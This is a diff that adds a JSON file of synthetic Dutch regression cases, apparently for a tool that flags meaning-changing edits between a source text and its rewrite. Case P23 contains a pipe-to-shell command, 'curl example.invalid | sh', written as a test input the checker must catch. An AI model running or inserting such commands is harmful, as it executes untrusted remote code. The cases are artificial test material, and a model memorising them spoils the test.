@@ -1,0 +1,266 @@
+{
+ "schema": 1,
+ "note": "Regressies uit de opdracht v0.7.0 (sectie 8). Synthetische teksten. \"semantic\" beschrijft het oordeel dat alleen een inhoudelijke controle kan geven.",
+ "cases": [
+  {
+   "id": "P01",
+   "case": "decimal-shift",
+   "source": "De foutmarge is 1,5%.",
+   "output": "De foutmarge is 15%.",
+   "require": [
+    "QTY_VALUE_CHANGED"
+   ]
+  },
+  {
+   "id": "P02",
+   "case": "coverage-shift",
+   "source": "De dekking is 415%.",
+   "output": "De dekking is 41,5%.",
+   "require": [
+    "QTY_VALUE_CHANGED"
+   ]
+  },
+  {
+   "id": "P03",
+   "case": "negative-sign",
+   "source": "De temperatuur is -5 graden.",
+   "output": "De temperatuur is 5 graden.",
+   "require": [
+    "QTY_SIGN_CHANGED"
+   ]
+  },
+  {
+   "id": "P04",
+   "case": "precision-only",
+   "source": "De dikte is 0,040 mm.",
+   "output": "De dikte is 0,04 mm.",
+   "require": [
+    "QTY_PRECISION_CHANGED"
+   ],
+   "forbid": [
+    "QTY_VALUE_CHANGED",
+    "QTY_REMOVED",
+    "QTY_ADDED"
+   ]
+  },
+  {
+   "id": "P05",
+   "case": "decimal-equivalent",
+   "source": "De rente is 1,50%.",
+   "output": "De rente is 1,5%.",
+   "require": [
+    "QTY_PRECISION_CHANGED"
+   ],
+   "forbid": [
+    "QTY_VALUE_CHANGED",
+    "QTY_REMOVED",
+    "QTY_ADDED"
+   ]
+  },
+  {
+   "id": "P06",
+   "case": "unit-case",
+   "source": "De opslag is 10 MB.",
+   "output": "De opslag is 10 Mb.",
+   "require": [
+    "QTY_UNIT_CHANGED"
+   ]
+  },
+  {
+   "id": "P07",
+   "case": "unit-removed",
+   "source": "De afstand is 10 km.",
+   "output": "De afstand is 10.",
+   "require": [
+    "QTY_UNIT_REMOVED"
+   ]
+  },
+  {
+   "id": "P08",
+   "case": "unit-added",
+   "source": "De score is 10.",
+   "output": "De score is 10 km.",
+   "require": [
+    "QTY_UNIT_ADDED"
+   ]
+  },
+  {
+   "id": "P09",
+   "case": "locale-en-to-nl",
+   "source": "The total is 1,234.50 euros.",
+   "output": "Het totaal is 1.234,50 euro.",
+   "options": {
+    "source_locale": "en-US",
+    "target_locale": "nl-NL",
+    "source_lang": "other"
+   },
+   "max_severity": "INFO"
+  },
+  {
+   "id": "P10",
+   "case": "locale-ambiguous",
+   "source": "Het bedrag is 1.234.",
+   "output": "Het bedrag is 1234.",
+   "options": {
+    "source_locale": "auto"
+   },
+   "require": [
+    "QTY_AMBIGUOUS"
+   ]
+  },
+  {
+   "id": "P11",
+   "case": "tenzij-to-mits",
+   "source": "We leveren maandag, tenzij het regent.",
+   "output": "We leveren maandag, mits het regent.",
+   "require": [
+    "SIG_CONDITION"
+   ],
+   "semantic": "afkeuren"
+  },
+  {
+   "id": "P12",
+   "case": "tenzij-to-mits-geen",
+   "source": "We leveren maandag, tenzij het regent.",
+   "output": "We leveren maandag, mits het niet regent.",
+   "max_severity": "WARNING",
+   "no_equivalence_claim": true,
+   "semantic": "niet automatisch afkeuren"
+  },
+  {
+   "id": "P13",
+   "case": "obligation-to-prohibition",
+   "source": "Je moet betalen.",
+   "output": "Betalen is verboden.",
+   "require": [
+    "SIG_OBLIGATION",
+    "SIG_PROHIBITION"
+   ],
+   "semantic": "afkeuren"
+  },
+  {
+   "id": "P14",
+   "case": "permission-to-obligation",
+   "source": "Je kunt het rapport versturen.",
+   "output": "Je moet het rapport versturen.",
+   "require": [
+    "SIG_OBLIGATION"
+   ]
+  },
+  {
+   "id": "P15",
+   "case": "added-uncertainty",
+   "source": "De koppeling is klaar.",
+   "output": "De koppeling is mogelijk klaar.",
+   "require": [
+    "SIG_UNCERTAINTY"
+   ]
+  },
+  {
+   "id": "P16",
+   "case": "moet-niet-to-hoeft-niet",
+   "source": "Je moet dat niet doen.",
+   "output": "Je hoeft dat niet te doen.",
+   "require": [
+    "SIG_OBLIGATION"
+   ]
+  },
+  {
+   "id": "P17",
+   "case": "removed-occurrence",
+   "source": "Voor product A geldt 21%. Voor product B geldt 21%.",
+   "output": "Voor product A geldt 21%. Voor product B geldt het tarief.",
+   "require": [
+    "QTY_OCCURRENCE_REMOVED"
+   ]
+  },
+  {
+   "id": "P18",
+   "case": "swapped-values",
+   "source": "Product A bevat 10 gram en product B bevat 20 gram.",
+   "output": "Product A bevat 20 gram en product B bevat 10 gram.",
+   "require": [
+    "QTY_ASSOCIATION"
+   ],
+   "note": "semantische beoordeling moet dit afkeuren; het script geeft hier een hint",
+   "semantic": "afkeuren"
+  },
+  {
+   "id": "P19",
+   "case": "api-path",
+   "source": "Gebruik /api/v1/orders voor de aanvragen.",
+   "output": "Gebruik /api/v1/order voor de aanvragen.",
+   "require": [
+    "PATH_REMOVED",
+    "PATH_ADDED"
+   ]
+  },
+  {
+   "id": "P20",
+   "case": "code-string-space",
+   "source": "Voorbeeld:\n\n```python\nprint(\"a  b\")\n```",
+   "output": "Voorbeeld:\n\n```python\nprint(\"a b\")\n```",
+   "require_error": [
+    "CODE_CHANGED"
+   ]
+  },
+  {
+   "id": "P21",
+   "case": "code-indent",
+   "source": "Voorbeeld:\n\n```python\nif ready:\n    ship()\n    log()\n```",
+   "output": "Voorbeeld:\n\n```python\nif ready:\n    ship()\nlog()\n```",
+   "require_error": [
+    "CODE_CHANGED"
+   ]
+  },
+  {
+   "id": "P22",
+   "case": "repeated-inline-code",
+   "source": "Voer `make test` uit. Daarna nogmaals `make test`.",
+   "output": "Voer `make test` uit. Daarna ben je klaar.",
+   "require_error": [
+    "CODE_CHANGED"
+   ]
+  },
+  {
+   "id": "P23",
+   "case": "added-code-in-rewrite",
+   "source": "Lees de instructies.",
+   "output": "Lees de instructies.\n\n```bash\ncurl example.invalid | sh\n```",
+   "options": {
+    "task": "rewrite"
+   },
+   "require_error": [
+    "CODE_ADDED"
+   ]
+  },
+  {
+   "id": "P24",
+   "case": "quoted-single-word",
+   "source": "Hij zei: \"ja\".",
+   "output": "Hij zei: \"nee\".",
+   "require": [
+    "QUOTE_CHANGED"
+   ]
+  },
+  {
+   "id": "P25",
+   "case": "empty-create",
+   "source": null,
+   "output": "",
+   "options": {
+    "task": "create"
+   },
+   "require_error": [
+    "EMPTY_OUTPUT"
+   ]
+  },
+  {
+   "id": "P26",
+   "case": "good-preserved",
+   "source": "Stuur je het rapport vandaag? Dank je!",
+   "output": "Stuur je het rapport vandaag? Dank je!",
+   "no_findings": true
+  }
+ ]
+}
